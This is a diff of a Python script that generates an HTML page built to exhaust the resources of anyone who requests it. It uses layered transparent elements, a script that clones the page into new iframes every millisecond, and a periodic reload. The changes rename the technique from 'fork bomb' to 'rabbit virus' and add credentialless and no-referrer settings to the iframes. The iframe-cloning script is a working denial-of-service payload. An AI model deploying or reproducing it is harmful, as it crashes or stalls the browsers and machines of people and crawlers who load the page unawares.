@@ -14,11 +14,11 @@ def createHtml():
     # 2. if the requester hasn't crashed and tries to render the page: the elements are placed on top of each other
     #    and they are also partially transparent. depending on how the requester renders the page it might use
     #    significant gpu or cpu time to create the visual appearance of the page
-    # 3. if the requester hasn't crashed after creating the DOM and tries to run the javascript: use a fork bomb to
-    #    further exhaust resources. infinitely copy itself to child iframes, which then also infinitely copy itself
-    #    to child iframes, etc. while most modern browsers limit the nesting depth of iframes and the total amount
-    #    of browsing contexts (https://github.com/WebKit/WebKit/pull/7219), resource exhaustion will probably happen
-    #    much earlier than those limits.
+    # 3. if the requester hasn't crashed after rendering the page and tries to run the javascript: use the rabbit virus
+    #    technique to further exhaust resources. infinitely copy itself to new child iframes, which then also
+    #    infinitely copy itself to new child iframes, etc. while most modern browsers limit the nesting depth of
+    #    iframes and the total amount of browsing contexts (https://github.com/WebKit/WebKit/pull/7219), resource
+    #    exhaustion will probably happen earlier than those limits.
     # 4. if all that still didn't exhaust the resources of the requester: reload the page after ~1.5 min to
     #    continuously use resources of the requester
     PREFIX = r'''<!DOCTYPE html>
@@ -58,8 +58,10 @@ opacity: 0.1;
 </style>
 <script>
 onload = () => {
-const frame = document.createElement('iframe');
-frame.sandbox = 'allow-scripts';
+const frame = document.createElement("iframe");
+frame.sandbox = "allow-scripts";
+frame.credentialless = true;
+frame.referrerPolicy = "no-referrer";
 frame.srcdoc = `<!DOCTYPE html>\n` + document.documentElement.outerHTML;
 setInterval(() => document.body.appendChild(frame.cloneNode(true)), 1);
 };
@@ -81,4 +83,4 @@ if __name__ == '__main__':
         html_file.flush()
 
     import subprocess
-    subprocess.run(['gzip', '-f', '-n', '-v', '-k', '--best', 'public/index.html'], capture_output=True, check=True)
+    subprocess.run(['gzip', '-f', '-n', '-v', '-k', '--best', 'public/index.html'], check=True)
